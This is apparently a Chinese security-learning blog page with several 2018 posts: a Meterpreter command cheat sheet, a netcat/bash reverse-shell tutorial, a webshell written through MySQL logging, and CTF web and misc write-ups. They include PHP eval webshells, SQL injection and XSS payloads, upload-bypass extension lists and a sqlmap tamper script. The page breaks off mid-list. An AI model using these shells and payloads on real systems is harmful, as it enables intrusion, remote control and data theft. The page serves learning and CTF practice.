msf exploit(handler) &gt; set lport 7778
lport =&gt; 7778
msf exploit(handler) &gt; exploit
[*] Started bind handler
[*] Sending stage (957999 bytes) to xxxx(外网Ip)
[*] Starting the payload handler...</code></pre><h2 id="靶机运行Payload"><a href="#靶机运行Payload" class="headerlink" title="靶机运行Payload"></a>靶机运行Payload</h2><p>Linux下运行elf会提示没有权限，加权限：</p>
<pre><code>chomd +x ./shell.elf</code></pre><p>然后再运行就可以了</p>
<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre><code>background  # 让meterpreter处于后台模式  
sessions -i index   # 与会话进行交互，index表示第一个session  
quit  # 退出会话  
shell # 获得控制台权限  
irb # 开启ruby终端</code></pre><h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><pre><code>cat # 查看文件内容  
getwd # 查看当前工作目录  
upload  # 上传文件到目标机上  
download # 下载文件到本机上  
edit # 编辑文件  
search  # 搜索文件</code></pre><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><pre><code>ipconfig / ifconfig # 查看网络接口信息  
portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 
rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码
route # 获取路由表信息</code></pre><h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><pre><code>ps # 查看当前活跃进程 
migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 
getpid # 获取当前进程的pid 
kill pid # 杀死进程 
getuid # 查看权限 
sysinfo # 查看目标机系统信息，如机器名，操作系统等 
shutdown # 关机</code></pre><p>相关链接：<br><a href="http://www.itlnmp.com/373.html" target="_blank" rel="noopener">防火墙（firewalld）端口转发</a><br><a href="http://www.lxhsec.com/2017/11/02/msf/" target="_blank" rel="noopener">利用metasploit进行提权</a><br><a href="http://wyb0.com/posts/msf-simple-elevate-privileges/" target="_blank" rel="noopener">Metasploit简单提权</a><br><a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener">sSocks下载</a><br><a href="http://www.freebuf.com/articles/system/12182.html" target="_blank" rel="noopener">Socks代理反弹突破内网</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/07/09/内网穿透进行Metasploit渗透/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/06/23/CTF中的Misc题目/"> 
                    CTF中的Misc题目 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-06-23   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，Misc/">ctf，Misc</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>因为最近要实验班考核，开始做一下Misc题目，毕竟要简单一些。。发现好多神奇在kali里面，就用ssh连接了本地win10和kali，搭了xftp互传文件，后台挂上kali解放双手解放内存，爽的不行~</p>
<h3 id="又是一张图片，还单纯么"><a href="#又是一张图片，还单纯么" class="headerlink" title="又是一张图片，还单纯么"></a>又是一张图片，还单纯么</h3><p>丢到kali的binwalk里扫一下：</p>
<pre><code>binwalk -e 2.jpg</code></pre><p>发现有好多文件，用Kali下的foremost分离一下：</p>
<pre><code>foremost 2.jpg</code></pre><p>分离了两张图片传回到win下查看flag</p>
<h3 id="linux基础"><a href="#linux基础" class="headerlink" title="linux基础"></a>linux基础</h3><p>给了一个flag未知类型的文件，又提示linux基础。<br>学会了一个linux下的打印命令：strings</p>
<pre><code>strings flag</code></pre><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>得到一个pcap的文件，果断丢到wireshark<br>追踪Tcp数据流发现有Base64编码的东西。<br>解码后发现有这个东西:C:\wwwroot\flag.tar.gz<br>我的想法是，可能这个pcap里还包含的有其它文件，不管了丢到binwalk里看一下<br><img src="https://s1.ax1x.com/2018/06/23/PpvTz9.png" alt="1"><br>果然有一个zip的压缩文件，但是我用foremost分离不出来，于是用binwalk的dd命令来提取：<br><img src="https://s1.ax1x.com/2018/06/23/Ppvbs1.png" alt="2"></p>
<p>注意偏移量的选取！</p>
<p>参考：<a href="https://blog.csdn.net/vspiders/article/details/72876889" target="_blank" rel="noopener">CTF中图片隐藏文件分离方法总结</a></p>
<h3 id="要蹭网先解开密码"><a href="#要蹭网先解开密码" class="headerlink" title="要蹭网先解开密码"></a>要蹭网先解开密码</h3><p>给了一个cap文件，放到kali里的aircrack里跑。<br>给了前七位，用密码工具生成完整的11位手机号码的密码字典。<br>接着执行如下命令：<br><img src="https://s1.ax1x.com/2018/06/23/P9kq9P.png" alt="1"><br>index那行提示是让我们看握手包的次数，显示的是三次就输入3</p>
<p>后期要做一个破解wifi的文章~</p>

                
            </div>
            <div class="continue">
            <a href="/2018/06/23/CTF中的Misc题目/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/06/21/Nc反弹Shell初识/"> 
                    Nc反弹Shell 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-06-21   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/反弹shell/">反弹shell</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>昨天打了sctf，太菜了还是从基础开始来吧，看到Bugku有一道命令执行的题目，因为没有回显要反弹到vps，由此接触到了反弹Shell这个东西</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>有一台centOS7的vps主机当作控制、接受机器，一台kali linux的内网虚拟机当作靶机。一开始vps开了端口，靶机怎么也连接不上。后来请教line师傅，他说vps要看防火墙的放行端口，然后我Google了vutlr机器的放行端口是全部Ban掉的。。。尼玛，贴一个用firewalld开防火墙端口的<a href="http://www.cnblogs.com/moxiaoan/p/5683743.html" target="_blank" rel="noopener">文章</a></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://p3.ssl.qhimg.com/t019632a21686694291.png" alt="1"><br>目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。</p>
<h3 id="bash-直接反弹"><a href="#bash-直接反弹" class="headerlink" title="bash 直接反弹"></a>bash 直接反弹</h3><ol>
<li><p>主机执行监听命令:</p>
<pre><code>nc -l -p 8080 -vvv</code></pre></li>
<li><p>靶机执行bash反弹命令：</p>
<pre><code>root# bash -i &gt;&amp; /dev/tcp/XXXXXX(开放监听的ip)/8000 0&gt;&amp;1</code></pre></li>
</ol>
<p><img src="https://s1.ax1x.com/2018/06/21/PSG5GD.jpg" alt="kaiqi"><br><img src="https://s1.ax1x.com/2018/06/21/PSGIRe.png" alt="xiaoguo"></p>
<ol start="3">
<li>可以看到，我们在主机输入whoami，命令会传到靶机执行，然后返回信息到主机。相当于靶机的shell反弹到了主机。</li>
</ol>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>反弹shell有十种方法，这里有两篇文很不错，再贴上一篇nc命令的讲解：<br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">linux各种一句话反弹shell总结</a></p>
<p><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>
<p><a href="https://www.cnblogs.com/chengd/p/7565280.html" target="_blank" rel="noopener">Linux每天一个命令：nc/ncat</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/06/21/Nc反弹Shell初识/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/06/20/一道SCTF写日志getshell/"> 
                    记SCTF的一道mysql日志写Shell题目 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-06-20   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>太尼玛菜了，感谢LinE师傅耐心点拨。</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这道题是phpmyadmin弱口令登入，账号密码root<br>进去之后应该是写shell，但是show variables 发现file_priv为null，这说明Into outfile写shell显然是不可能了。</p>
<ol>
<li>百度到一种绕过file_priv写shell的方法： <a href="https://www.cnblogs.com/xishaonian/p/6622818.html" target="_blank" rel="noopener">phpmyadmin通过日志文件拿到webshell</a></li>
<li>接下来我们要找路径，我们可以通过找Log变量猜测绝对路径：<br><img src="https://s1.ax1x.com/2018/06/20/CzxNJH.png" alt="tupian"></li>
<li>有一点需要注意我们写小马的时候[]中尽量用双引号，否则会有转义的麻烦，我这次写的一句话是这样的：<pre><code>&lt;?php eval($_POST[&quot;hpdoger&quot;]); ?&gt;</code></pre></li>
</ol>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>set global general_log=’on’;<br>set global general_log_file=’G:/apm/apache2/htdocs/config.php’;</p>
<p>这个log的路径自己发挥，想办法找可写路径。可以看一下log变量原来有没有路径</p>
<p>select “<?php @eval($_POST['hpdoger']); ?>“;<br>set global general_log=off;</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>我真的好菜啊…</p>

                
            </div>
            <div class="continue">
            <a href="/2018/06/20/一道SCTF写日志getshell/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/06/06/Web题目/"> 
                    CTF中的Web题目 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-06-06   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="CTF中的web题目"><a href="#CTF中的web题目" class="headerlink" title="CTF中的web题目"></a>CTF中的web题目</h1><hr>
<h2 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h2><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p><img src="https://s1.ax1x.com/2018/06/17/CvjhN9.png" alt="tupian"><br>!is_numeric($num): 判断输入不是数字或数字字符串<br>还要让输入的值==1,我们就构造字符串，num=1a，等号判断时，会取字符串第一个值进行比较</p>
<h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><p><img src="https://s1.ax1x.com/2018/06/17/CvxWWR.png" alt="bianliang"><br>preg_match进行正则匹配，\w+匹配一或多个字符数字下划线，后面dump的变量是可变变量，所以可以借机把我们想要的变量打印出来，一开始我构造args=flag，并无卵用。返回NULL，说明不存在flag这个变量，那我们就把所有的变量都打印出来。</p>
<p>这里用到超全局变量GLOBAL,构造args=GLOBAL,打印出来所有变量即可</p>
<h3 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h3><p>研究了一天的xss，并没有什么实际的进展。这道xss是用htmlspecialchars()函数将&lt;、&gt;进行html实体化，让浏览器在html编码解析时，发现它是实体化的编码，就把他们解码为普通的可视化的&lt;、&gt;。这里我们看源码知道这是utf-8的编码方式，我们如果用unicode的方式编码&lt;，后端不识别这个unicode为&lt;，但html解析之后，unicode又变回&lt;，js解析器解析完script标签之后，触发Js引擎执行这段js代码。所以我们构造playload:</p>
<pre><code>\u003cscript\u003ealert(_key_)\u003c/script\u003e</code></pre><p>\u开头好像表示的是Utf-8的unicode编码形式（瞎猜的），好菜啊。。这个并没有完全搞懂。<br>google了半天的浏览器渲染，明白了这个道理：一旦html解析到script标签的时候，就会启动js解析器来解析标签里面的东西，js解析完了之后就执行里面的Js语句。html继而再向后进行解析。</p>
<p>贴几个介绍编码绕过xss的文章：<br><a href="https://blog.csdn.net/xiaozhuxmen/article/details/52014901" target="_blank" rel="noopener">浏览器加载、解析、渲染的过程</a><br><a href="https://www.cnblogs.com/flycat-2016/p/6507543.html" target="_blank" rel="noopener">xss编码与绕过</a><br><a href="http://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener">xss编码剖析</a><br><a href="https://unicode-table.com/en/#control-character" target="_blank" rel="noopener">字符转unicode</a></p>
<h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>提示让我们看源码，发现有一串url编码的东西，<br>解码后传值就行了，拼接两个escape的值</p>
<h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>备份文件泄露，php代码泄露检测工具<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">SourceLeakHacker</a></p>
<h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>查看源码有一个1p.html页面，访问之后出现一堆base64编码的内容，解码后是页面源码，费劲心思构造b，没想到最后直接访问f4l2a3g.txt就可以…</p>
<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>题目给出你了源码</p>
<pre><code>&lt;?php 
$poc=&quot;a#s#s#e#r#t&quot;; 
$poc_1=explode(&quot;#&quot;,$poc);
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
$poc_2($_GET[&#39;s&#39;]) 
?&gt;</code></pre><p>也就是说会执行一个(assert函数)[<a href="http://www.php.net/manual/zh/function.assert.php]" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.assert.php]</a><br>所以我们只需要给s赋值为我们想要执行的语句。<br>看到别人的Wp,应该是先扫描一下当前目录看有什么东西<br>payload:</p>
<pre><code>s = print_r(scandir(&#39;./&#39;))</code></pre><p>这里我们用print_r来打印数组相关信息，而不是print。<br>关于绝对路径的用法：</p>
<ol>
<li>./  当前目录</li>
<li>../ 上层目录</li>
<li>../../  上2层目录</li>
</ol>
<h3 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h3><p>这个跟实验吧php是最好的语言有点类似。<br>打开它提示的链接，然后代码审计。<br>md5可以用数组绕过，也可以用0e开头的md5值绕过。<br>Strcmp可以用数组绕过。<br>我的payload:</p>
<pre><code>?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1</code></pre><p>po一个php函数漏洞的总结<a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">链接</a></p>
<h3 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h3><p>hint:sql约束攻击<br>去百度了一下什么叫<a href="https://blog.csdn.net/qq_32400847/article/details/54137747" target="_blank" rel="noopener">约束攻击</a><br>约束的意思就是对长度进行约束，看完上面的链接基本上就知道注册时的用户名怎么构造了。<br>我的构造:<br><code>admin                                     （前方为空格）</code></p>
<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>这个题有点意思，涉及到extract()变量覆盖，看一下给的源代码:</p>
<pre><code>&lt;?php
extract($_GET);
if (!empty($ac))
{
$f = trim(file_get_contents($fn));
if ($ac === $f)
{
echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
}
else
{
echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
}
}
?&gt;</code></pre><ul>
<li><p>首先了解一下empty函数<br>这个函数一开始把我误导了，empty是用来测试变量是否已经配置。若变量已存在、非空字符串或者非零，则返回 false 值，反之返回ture。</p>
</li>
<li><p>再介绍一下extract函数：<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
</li>
</ul>
<p>题目提示有txt文件，我们访问一下flag.txt，发现内容是：flags。<br>我们要传入一个非空的ac,让它的值===$f，$f来自于读取文件获得里面的字符串，文件名叫$fn。目前我们不知道$fn指向哪个文件，但是我们知道有flag.txt这个文件。所以我们让$ac=flags并且$fn=flag.txt就行了<br>payload:</p>
<pre><code>?$ac=flags&amp;$fn=flag.txt</code></pre><h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>这是一个上传绕过题目，后缀很名单检测和类型检测<br>php别名php2, php3, php4, php5, phps, pht, phtm, phtml<br>发现php5可以绕过，还要更改 Content-Type里，把multipart改成大写（搞不懂问什么）。<br>贴一个上传绕过总结的[链接]（<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）</a></p>
<p>上传文件时waf会检查哪里？<br>请求的url<br>Boundary边界<br>MIME类型<br>文件扩展名<br>文件内容</p>
<p>常见扩展名黑名单：<br>asp|asa|cer|cdx|aspx|ashx|ascx|asax<br>php|php2|php3|php4|php5|asis|htaccess<br>htm|html|shtml|pwml|phtml|phtm|js|jsp<br>vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</p>
<h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><p>写着sql注入的名字，看到网上说竟然是DS_Store源码泄露？？exm？？？最后直接访问<a href="http://120.24.86.145:8007/web2/flag，就可以下载到flag" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/flag，就可以下载到flag</a></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">题目链接</a><br>既然提示了报错注入，我们就按照提示来注入，我使用的是updatexml报错函数，测试一下：<br><img src="https://s1.ax1x.com/2018/06/06/C7bVXV.png" alt="ceshi"><br>可以看到，爆出了库名，说明这个方法可行。题目给了提示让我们读文件内容，要用到load_file函数，先看一下函数的几种用法举例：</p>
<pre><code>select load_file(&#39;c:/boot.ini&#39;)
select load_file(0x633a2f626f6f742e696e69)
select load_file(&#39;//ecma.io/1.txt&#39;) # smb协议
select load_file(&#39;\\\\ecma.io\\1.txt&#39;) # 可用于DNS隧道</code></pre><p>我们的思路是把concat里面查询数据库的句子替换为substr（返回值函数），不让报错函数打印数据库的名字了，而是打印我们读到的文件内容，substr就相当于printf的作用。题目过滤了单引号，我们就用十六进制表示绝对路径，但是要用到hex()函数让数据库知道我们要将字符串转为16进制。值得注意的是concat语句第一个空不可省略，否则打印不出内容。完整的payload:</p>
<pre><code>http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30)),1)</code></pre><p>先返回读到内容前30位的16进制，再更改语句依次往后读：</p>
<pre><code>http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30)),1)</code></pre><p><img src="https://s1.ax1x.com/2018/06/06/C7bm0U.png" alt="tupian"><br>将读到的16进制转换为字符：<br><img src="https://s1.ax1x.com/2018/06/06/C7bemT.png" alt="jieguo"></p>
<h3 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h3><p>先审计一下源码：</p>
<pre><code>error_reporting(0);

function getIp(){
$ip = &#39;&#39;;
if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
$ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
}else{
$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
}
$ip_arr = explode(&#39;,&#39;, $ip);
return $ip_arr[0];

}

$host=&quot;localhost&quot;;
$user=&quot;&quot;;
$pass=&quot;&quot;;
$db=&quot;&quot;;

$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);

mysql_select_db($db) or die(&quot;Unable to select database&quot;);

$ip = getIp();
echo &#39;your ip is :&#39;.$ip;
$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
mysql_query($sql);</code></pre><p>explode过滤逗号，所以报错注入肯定行不通。看到网上的Wp说是基于时间的盲注，盲注点很显然是XFF。经过测试payload有效：</p>
<pre><code>X-Forwarded-For:1&#39;+sleep(5) and &#39;1&#39;=&#39;1</code></pre><p>页面返回有一个延时，这里就不能用if(,,)语句了，因为过滤了逗号，用另一个注入语句:</p>
<pre><code>select case when (条件) then 代码1 else 代码 2 end</code></pre><p>于是有了如下的payload：</p>
<pre><code>1&#39; and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and &#39;1&#39;=&#39;1</code></pre><p>emmm,手注是不可能的，这辈子是不可能手注的（手动滑稽），我们抓个包让sqlmap以XFF为注入点扫描，再加个过滤逗号的tamper就好了。若以XFF为注入点，则要在抓包后的导出文件里XFF后加*，标识为注入点如图：<br><img src="https://s1.ax1x.com/2018/06/06/CHe1Cd.png" alt="zhurudian"><br>然后找了网上大神的过滤逗号的tamper，放在Sqlmap目录里，命名为comamalessmysql.py</p>
<pre><code>#!/usr/bin/env python

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    &quot;&quot;&quot;
    Replaces some instances with something whthout comma 

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0


    &gt;&gt;&gt; tamper(&#39;ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))&#39;)
    &#39;ISNULL(NULL)&#39;

    &gt;&gt;&gt; tamper(&#39;MID(VERSION(), 2, 1)&#39;)
    &#39;MID(VERSION() FROM 2 FOR 1)&#39;

    &gt;&gt;&gt; tamper(&#39;IF(26=26,0,5)&#39;)
    &#39;CASE WHEN 26=26 THEN 0 ELSE 5 END&#39;

    &gt;&gt;&gt; tamper(&#39;IFNULL(NULL,0x20)&#39;)
    &#39;CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END&#39;

    &gt;&gt;&gt; tamper(&#39;LIMIT 2, 3&#39;)
    &#39;LIMIT 3 OFFSET 2&#39;
    &quot;&quot;&quot;


    def commalessif(payload):
        if payload and payload.find(&quot;IF&quot;) &gt; -1:
            while payload.find(&quot;IF(&quot;) &gt; -1:
                index = payload.find(&quot;IF(&quot;)
                depth = 1
                comma1, comma2, end = None, None, None

                for i in xrange(index + len(&quot;IF(&quot;), len(payload)):
                    if depth == 1 and payload[i] == &#39;,&#39; and not comma1:
                        comma1 = i

                    elif depth == 1 and payload[i] == &#39;,&#39; and comma1:
                        comma2 = i

                    elif depth == 1 and payload[i] == &#39;)&#39;:
                        end = i
                        break

                    elif payload[i] == &#39;(&#39;:
                        depth += 1

                    elif payload[i] == &#39;)&#39;:
                        depth -= 1

                if comma1 and comma2 and end:
                    _ = payload[index + len(&quot;IF(&quot;):comma1]
                    __ = payload[comma1 + 1:comma2]
                    ___ = payload[comma2 + 1:end]
                    newVal = &quot;CASE WHEN %s THEN %s ELSE %s END&quot; % (_, __, ___)
                    payload = payload[:index] + newVal + payload[end + 1:]
                else:
                    break

        return payload

    def commalessifnull(payload):
        if payload and payload.find(&quot;IFNULL&quot;) &gt; -1:
            while payload.find(&quot;IFNULL(&quot;) &gt; -1:
                index = payload.find(&quot;IFNULL(&quot;)
                depth = 1
                comma, end = None, None

                for i in xrange(index + len(&quot;IFNULL(&quot;), len(payload)):
                    if depth == 1 and payload[i] == &#39;,&#39;:
                        comma = i

                    elif depth == 1 and payload[i] == &#39;)&#39;:
                        end = i
                        break

                    elif payload[i] == &#39;(&#39;:
                        depth += 1

                    elif payload[i] == &#39;)&#39;:
                        depth -= 1

                if comma and end:
                    _ = payload[index + len(&quot;IFNULL(&quot;):comma]
                    __ = payload[comma + 1:end].lstrip()
                    newVal = &quot;CASE WHEN %s=NULL THEN %s ELSE %s END&quot; % (_, __, _)
                    payload = payload[:index] + newVal + payload[end + 1:]
                else:
                    break

        return payload

    retVal = payload

    if payload:
        retVal = re.sub(r&#39;(?i)TIMESTAMPADD\(\w+,\d+,NULL\)&#39;, &#39;NULL&#39;, retVal)
        retVal = re.sub(r&#39;(?i)MID\((.+?)\s*,\s*(\d+)\s*\,\s*(\d+)\s*\)&#39;, &#39;MID(\g&lt;1&gt; FROM \g&lt;2&gt; FOR \g&lt;3&gt;)&#39;, retVal)
        retVal = commalessif(retVal)
        retVal = commalessifnull(retVal)
        retVal = re.sub(r&#39;(?i)LIMIT\s*(\d+),\s*(\d+)&#39;, &#39;LIMIT \g&lt;2&gt; OFFSET \g&lt;1&gt;&#39;, retVal)

    return retVal
</code></pre><p>然后Sqlmap里跑一下，语句如下:<br><img src="https://s1.ax1x.com/2018/06/07/CHlWOs.jpg" alt="sqlmap"></p>
<h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><p>这道题困了我一天，一开始我以为是盲注，于是花时间在写脚本花了一天。。后来找到一个wp其实就是手注，只是过滤掉了union一些关键词，看一下题目：</p>
<ul>
<li>查询有结果时，返回nothing</li>
<li>查询无结果时，返回error</li>
<li>%23可注释，引号可用</li>
</ul>
<p>ok，知道上述条件，我们测一下它过滤了什么。<br>介绍一种检查过滤的方法，叫异或判断：<br>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。ysql里异或运算符为^ 或者 xor</p>
<ol>
<li>构造id=1’^(条件)^’</li>
<li>判断的两个条件一个是括号里的条件，另一个是后面的’’，’’为空，即为0。所以括号里的条件若是成立，则页面返回错误；反之则页面返回正常</li>
<li>完整payload:<pre><code>http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;union&#39;)=5)^&#39;</code></pre>返回正确，说明判断条件是错的，所以union被过滤了<br>我们用叠加语句看一下 uniunionon是否会被过滤，payload:<pre><code>http://120.24.86.145:9004/1ndex.php?id=1&#39;^(length(&#39;uniunionon&#39;)=5)^&#39;</code></pre>返回错误，说明判断条件正确，所以这个可以当作union使用。</li>
<li>接下来就是一些基础查询了，题目说有两个flag，再查到另一个列时，出现一个网址：<br>Once_More.php</li>
<li>里面还有一道注入题，因为它会回显你提交的参数，所以想知道过滤了什么直接就可以看出来，过滤了Union，我用的报错注入解决的</li>
<li>over，这道题学习了异或注入判断过滤。</li>
</ol>
<h3 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3{SKCTF}"></a>login3{SKCTF}</h3><p>tip给了说是布尔盲注<br>在username这个注入点测试一下，初步手工模糊测试，发现过滤了空格、逗号、等号，没有过滤#和’。因为是布尔盲注，那我们构造ascii函数语句。首先我们猜测一个用户名吧,就猜Admin,发现回显是：password error。<br>这说明这个用户名存在，那么我们就可以把这句话作为一个判断对错的语句，结合异或注入进行ascii的猜测。（用户名错误时会返回 username does not exist!）</p>
<ol>
<li>过滤了‘=’，那么我们ascii的等号语句就没法使用了，经过测试like是绕不过去的。那我们就通过这句话替换掉等号：<pre><code>username=admin&#39;^(ascii(&#39;a&#39;)-97)</code></pre>等价于：<pre><code>username=admin&#39;^(0)</code></pre>异或注入，因为a的十进制ascii为97，所以与（0）异或。</li>
</ol>
<ul>
<li>（0）条件时返回”password error”</li>
<li>其余条件时返回”username does not exist!”</li>
</ul>
<ol start="2">
